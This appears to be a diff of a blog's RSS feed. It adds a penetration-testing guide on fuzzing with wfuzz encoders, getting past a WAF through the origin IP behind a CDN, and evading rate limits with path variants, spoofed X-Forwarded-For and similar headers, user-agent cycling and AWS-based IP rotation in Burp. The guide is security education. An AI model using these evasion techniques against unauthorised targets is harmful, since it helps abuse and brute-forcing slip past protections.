+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;List encoding methods:&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;wfuzz&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;encoders&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;Encode payload before it&amp;rsquo;s sent&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;wfuzz&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;z&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;file&lt;/span&gt;,&lt;span style=&#34;color:#a6e22e&#34;&gt;wordlist&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;general&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;common&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;txt&lt;/span&gt;,&lt;span style=&#34;color:#a6e22e&#34;&gt;md5&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;http&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;//testphp.vulnweb.com/FUZZ
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;Multiple Encoders&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;wfuzz&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;z&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;list&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;,&lt;span style=&#34;color:#a6e22e&#34;&gt;md5&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;sha1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;none&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;http&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;//webscantest.com/FUZZ
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;5---using-ip-address-instead-of-the-domain&#34;&gt;5 - Using IP Address instead of the domain&lt;/h3&gt;
+&lt;p&gt;Sometimes there could be some some &lt;em&gt;Subdomains&lt;/em&gt; and/or &lt;em&gt;endpoints&lt;/em&gt; that are protected by WAF :&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_03_110036.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;A very common way to bypass this is by using the IP Address instead of the domain , we can get the IP by using &lt;code&gt;Shodan&lt;/code&gt; extension&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_03_110452.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;But this IP is provided by a CDN (Cloudflare in this example), so it&amp;rsquo;s used by more that one host. Thus, we need to test all active ports until we find which one maps to the website we are testing.&lt;/p&gt;
+&lt;p&gt;Scenarios :&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl target.com/  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;gt; Forbidden &lt;span style=&#34;color:#ae81ff&#34;&gt;403&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl ip:port      &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;gt; Success &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl target.com/  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;gt; Success &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl target.com/protected/endpoint  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;gt; Forbidden &lt;span style=&#34;color:#ae81ff&#34;&gt;403&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl ip:port/protected/endpoint  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;gt; Success &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;CDNs &lt;strong&gt;sometimes&lt;/strong&gt; blocks access by IP Address to protect from this bypass technique&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_03_111118.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;6---rate-limits-testing&#34;&gt;6 - Rate Limits Testing&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;API providers may include its rate limiting details publicly on its website or in API documentation.&lt;/li&gt;
+&lt;li&gt;Check Headers&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;x&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;rate&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;limit&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;x&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;rate&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;limit&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;remaining&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Other APIs won&amp;rsquo;t have an indication but once you exceed the limit you receive &lt;code&gt;429 Too Many Requests&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;Retry-After:&lt;/code&gt; Indicates when you can submit additional requests.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;em&gt;How to test Rate Limiting ?&lt;/em&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; avoid being rate limited altogether&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; bypass the mechanism that is blocking you once you are rate limited (Blocked because of IP ? Auth Token ?)&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;61---lax-rate-limits&#34;&gt;6.1 - Lax Rate Limits&lt;/h4&gt;
+&lt;p&gt;Let&amp;rsquo;s say &lt;code&gt;Rate limit  = 15 000 Request/min&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;-t&lt;/em&gt; option allows you to specify the concurrent &lt;strong&gt;number of connections&lt;/strong&gt;,
+&lt;em&gt;-s&lt;/em&gt; option allows you to specify a &lt;strong&gt;time delay&lt;/strong&gt; between requests.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_010914.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;This will send &lt;code&gt;12 000 Request/min&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wfuzz -s 0.0005
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Or use Burp &lt;em&gt;Intruder&lt;/em&gt;/&lt;em&gt;Ressource Pool&lt;/em&gt;&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_011645.png&#34; alt=&#34;image&#34;&gt;&lt;/td&gt;
+&lt;td&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_011508.png&#34; alt=&#34;image&#34;&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h4 id=&#34;62---path-bypass&#34;&gt;6.2 - Path Bypass&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;If you reach the rate limit, try &lt;em&gt;Null Bytes&lt;/em&gt; , &lt;em&gt;Case&lt;/em&gt; &amp;amp;  &lt;em&gt;Meaningless Parameters&lt;/em&gt; at the end , this could :
+Restart the rate limit
+Bypass Rate limiting&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;POST&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;api&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;myprofile&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;POST&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;api&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;myprofile&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;POST&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;api&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;myProfile&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;POST&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;api&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;MyProfile&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;POST&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;api&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;my&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;profile&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;POST&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;api&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;myprofile&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;test&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;If meaningless Parameters are restarting rate limiting just change parameter value in every request :&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;POST&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;api&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;myprofile&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;test&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;§&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;§&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Set the attack type to &lt;em&gt;pitchfork&lt;/em&gt; and use the same value for both payload positions.
+This tactic allows you to use the smallest number of requests required to brute-force the &lt;strong&gt;uid&lt;/strong&gt;.&lt;/p&gt;
+&lt;h4 id=&#34;63---origin-header-spoofing&#34;&gt;6.3 - Origin Header Spoofing&lt;/h4&gt;
+&lt;p&gt;Add these headers &lt;strong&gt;one by one&lt;/strong&gt; (If you include all headers at once, you may
+receive a 431 Request Header Fields Too Large status code)&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;X-Forwarded-For: 127.0.0.1
+X-Forwarded-Host: 127.0.0.1
+X-Host: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Client-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Sometimes, &lt;strong&gt;User-Agent&lt;/strong&gt; header will be used in combination with other headers to help identify and block an attacker.&lt;/p&gt;
+&lt;p&gt;Use &lt;code&gt;SecLists/Fuzzing/User-Agents/UserAgents.fuzz.txt&lt;/code&gt; to cycle trough user-agents&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-ad-done&#34; data-lang=&#34;ad-done&#34;&gt;title: Bypassed 
+You’ll know you’ve succeeded if an `x-rate-limit` header **resets** or if you’re able to make successful requests after being blocked.
+&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;64---rotating-ip-addresses-in-burp-suite&#34;&gt;6.4 - Rotating IP Addresses in Burp Suite&lt;/h4&gt;
+&lt;p&gt;If WAF Blocks IP, Use &lt;em&gt;IP Rotate&lt;/em&gt; &lt;strong&gt;Burp Extension&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_122633.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Install &lt;em&gt;boto3&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pip3 install boto3
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Install &lt;em&gt;Jython&lt;/em&gt; for BurpSuite&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Install &lt;em&gt;IP Rotate&lt;/em&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;em&gt;Add User&lt;/em&gt; in aws -&amp;gt; IAM
+&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_123117.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_123340.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_123417.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Create User&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_123526.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Download &lt;em&gt;CSV file&lt;/em&gt; containing your user’s &lt;strong&gt;access key&lt;/strong&gt; and &lt;strong&gt;secret access key&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;In Burp :&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_124007.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Save Keys&lt;/em&gt; =&amp;gt; &lt;em&gt;Enable&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;Now, security controls that block you based solely on your IP address
+will stand no chance.&lt;/p&gt;
+</content>
+    </item>
+    
     <item>
       <title>Hello Friend</title>
       <link>http://localhost:1313/newblog/posts/hello/</link>
